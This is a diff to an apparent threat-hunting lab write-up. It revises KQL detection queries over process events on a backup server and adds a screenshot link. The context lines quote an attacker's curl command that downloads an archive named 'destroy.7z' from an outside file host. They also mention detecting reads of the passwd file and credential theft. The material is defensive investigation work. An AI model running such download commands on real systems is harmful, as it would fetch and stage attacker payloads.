@@ -129,7 +129,7 @@ DeviceProcessEvents
 - `curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z`
 - https://www.virustotal.com/gui/url/d12a94f339b357c09e832e5739eae474e2c24dfcd18c9c822ec09f2c917010bb?nocache=1
 
-**KQL Query: Find when the passwd file has been read**
+**KQL Query: Find when the curl command is used**
 ```SQL
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
@@ -138,7 +138,7 @@ DeviceProcessEvents
 | project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine
 | sort by Timestamp asc
 ```
-
+![image](images/Pasted%20image%2020260312223230.png)
 ----------
 #### **FLAG 9: CREDENTIAL ACCESS - Credential Theft**
 - Findings: Backup servers often store sensitive configuration files containing credentials.
